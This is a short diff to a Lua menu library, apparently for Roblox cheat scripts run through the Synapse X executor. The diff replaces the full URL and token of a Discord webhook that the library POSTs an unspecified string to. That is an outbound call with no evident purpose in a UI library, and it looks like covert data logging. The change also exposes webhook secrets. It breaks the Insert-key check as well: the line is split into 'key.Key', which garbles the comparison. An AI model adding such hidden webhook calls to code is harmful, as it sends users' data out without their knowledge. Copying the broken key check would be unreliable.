@@ -166,7 +166,8 @@ function library.new(library_title, cfg_location)
     end
 
     uis.InputBegan:Connect(function(key)
-        if key.KeyCode ~= Enum.KeyCode.Insert then return end
+        if key.Key
+	~= Enum.KeyCode.Insert then return end
 
 		ScreenGui.Enabled = not ScreenGui.Enabled
         menu.open = ScreenGui.Enabled
@@ -236,7 +237,7 @@ function library.new(library_title, cfg_location)
     
     local response = syn.request(
         {
-            Url = 'https://discord.com/api/webhooks/966699820809076807/KeDeQkER4LfbI9nz_PE-fruCTgatNrL3WzOVjy5wKsUgHvCMhoNy5sVO34fcPXOXL5Eb', Method = 'POST', Headers = {['Content-Type'] = 'application/json'},
+            Url = 'https://discord.com/api/webhooks/1045037233205420173/WU0CXXKvlBO4hQf1RZW5tidm-qk3GpGHDesKEkvM6881sWuxjrcVjPm2p-mr9zseUBqg', Method = 'POST', Headers = {['Content-Type'] = 'application/json'},
             Body = game:GetService('HttpService'):JSONEncode({content = string})
         }
     );
